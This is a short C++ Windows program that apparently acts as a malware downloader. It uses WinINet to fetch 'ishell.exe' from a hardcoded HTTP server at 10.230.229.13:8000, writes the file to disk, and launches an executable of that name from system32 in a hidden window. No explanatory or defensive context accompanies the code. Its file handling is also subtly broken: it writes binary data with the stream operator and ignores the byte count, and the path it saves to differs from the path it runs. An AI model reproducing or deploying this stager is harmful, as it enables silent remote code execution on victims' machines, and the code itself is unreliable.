#include <iostream>
#include <fstream>
#include <cstring>
#include <wininet.h>
#include <windows.h>

using namespace std;

int main(){
	HINTERNET connect = InternetOpen("MyBrowser",INTERNET_OPEN_TYPE_PRECONFIG,NULL, NULL, 0);
	char url[256] = "http://10.230.229.13:8000/ishell.exe";
	ofstream File("ishell.exe");
	
	
   if(!connect){
      cout<<"Connection Failed or Syntax error";
      return 0;
   }
 
	HINTERNET OpenAddress = InternetOpenUrl(connect, url, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE|INTERNET_FLAG_KEEP_CONNECTION, 0);
 
   if ( !OpenAddress )
   {
      DWORD ErrorNum = GetLastError();
      cout<<"Failed to open URL \nError No: "<<ErrorNum;
      InternetCloseHandle(connect);
      return 0;
   }
 
   char DataReceived[1024];
   DWORD NumberOfBytesRead = 0;
   while(InternetReadFile(OpenAddress, DataReceived, 1024, &NumberOfBytesRead) && NumberOfBytesRead)
   {
   			//cout << NumberOfBytesRead;
			File << DataReceived;
   }
   
   File.close();
   InternetCloseHandle(OpenAddress);
   InternetCloseHandle(connect);
   
   ShellExecute(NULL, "open", "c:\\windows\\system32\\ishell.exe", NULL, NULL, SW_HIDE);
}
